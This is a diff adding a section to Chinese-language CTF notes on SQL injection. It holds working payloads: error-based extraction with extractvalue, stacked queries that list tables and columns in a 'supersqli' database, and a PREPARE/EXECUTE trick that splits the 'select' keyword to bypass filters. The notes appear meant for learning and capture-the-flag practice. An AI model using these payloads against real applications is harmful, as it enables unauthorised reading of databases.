@@ -27,3 +27,26 @@
 ````
 
 原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。
+
+### 堆叠注入(适用于过滤了select等且可以执行多语句的题目)
+
+**过滤selecet获取数据库名(报错注入)**  `1' and extractvalue(1,concat('~',database()))#`
+
+**堆叠注入获取表名**  `-1';use supersqli;show tables;#`  中间使用数据库名可以省略
+
+**堆叠注入获取字段** 
+
+````sql
+-1';use supersqli;show columns from `1919810931114514`;#
+````
+
+中间使用数据库名可以省略
+
+**堆叠注入执行任意语句**
+
+````sql
+-1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
+````
+
+使用sql的预处理将关键词拆开组合，绕过过滤
+
